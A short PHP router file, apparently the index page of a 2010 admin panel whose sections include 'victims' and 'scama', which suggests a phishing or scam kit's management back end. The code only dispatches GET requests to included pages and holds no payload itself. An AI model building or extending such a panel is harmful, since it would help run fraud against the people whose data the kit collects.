<?

// ################################
// #                                                             
// #  ======== Programming By Mr muradblood ===========  
// #
// #    The Scripet Progeramed By Th3 Basmir And Mr muradblood
// #
// #  Copyright © 2010 Mr muradblood. All Rights Reserved. 
// #
// #  If you want any support vist this site.           
// #           http://3sabh.com 
// #
// ################################

$do = trim($_GET['do']);
$type = trim($_GET['type']);
$method = trim($_GET['method']);
$u_id = intval($_GET['u_id']);
$id = intval($_GET['id']);
require_once('muradblood_File4is/connect.php');
require_once('muradblood_File4is/function.php');
require_once('muradblood_File4is/header.php');
switch($do){
	case '':
	include ('muradblood_File4is/home.php');
	break;
	case 'users':
	include ('muradblood_File4is/users.php');
	break;
	case 'victims':
	include ('muradblood_File4is/victims.php');
	break;
	case 'site_conf':
	include ('muradblood_File4is/site_conf.php');
	break;
	case 'site_ads':
	include ('muradblood_File4is/site_ads.php');
	break;
	case 'scama':
	include ('muradblood_File4is/scama.php');
	break;
	case 'register':
	include ('muradblood_File4is/register.php');
	break;
	default:
	include ('muradblood_File4is/no_page.php');
	break;
}
require_once('muradblood_File4is/footer.php');
?>